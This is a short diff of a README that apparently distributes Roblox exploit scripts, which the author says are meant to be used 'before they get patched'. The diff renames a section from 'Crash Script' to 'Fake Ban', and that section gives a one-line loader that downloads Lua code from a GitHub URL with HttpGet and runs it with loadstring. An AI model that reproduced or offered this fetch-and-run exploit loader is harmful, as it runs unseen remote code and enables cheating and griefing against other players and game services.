@@ -7,7 +7,7 @@ Don't go around talking about this before they get patched 💀 No one want's sc
 Contact me on discord (**folixx**) or twitter (**zxfolix**)
 I honestly don't put effort on updating the readme, so don't expect me to add the info right away.
 
-# Crash Script [SOURCE](https://raw.githubusercontent.com/wtfplayer/redemption/main/universal.lua)
+# Fake Ban [SOURCE](https://raw.githubusercontent.com/wtfplayer/redemption/main/universal.lua)
 
 ```lua
 loadstring(game:HttpGet("https://raw.githubusercontent.com/wtfplayer/redemption/main/universal.lua"))()
